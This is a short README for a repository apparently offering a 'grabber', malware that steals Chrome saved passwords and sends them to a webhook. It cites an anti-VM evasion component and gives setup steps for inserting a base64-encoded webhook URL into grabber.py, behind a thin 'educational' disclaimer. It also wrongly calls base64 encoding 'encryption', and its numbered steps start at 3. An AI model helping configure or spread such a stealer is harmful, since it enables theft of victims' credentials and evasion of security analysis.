# Grabber
I'd recommend looking into the code before just using it straight away.

### Disclaimer
Some of the things in this repo should only be used in an educational enviroment, like the grabbers. I'm not liable for the damages caused by your actions.

### Some things to note:
* The webhook urls are encoded in base64 for extra encryption.
* The chrome passwords are encrypted by default, I wouldn't recommend changing that, as if you accidently leaked it, you're fucked.
  - You can easily decrypt them with the key and the decrypt_pass.py file.

Chrome Passwords was from the [Backdoor Machine](https://github.com/yunusborazan/Backdoor-Machine).

Anti-VM was from my [repo](https://github.com/ItsChasa/Bypass-VirusTotal).

3. Go to [base64encode.org](https://www.base64encode.org/) and put your webhook url in, press encode, and copy the long string that appears.
4. Edit the grabber.py file and on line 39, in the two "", put the string you copied inside the "".
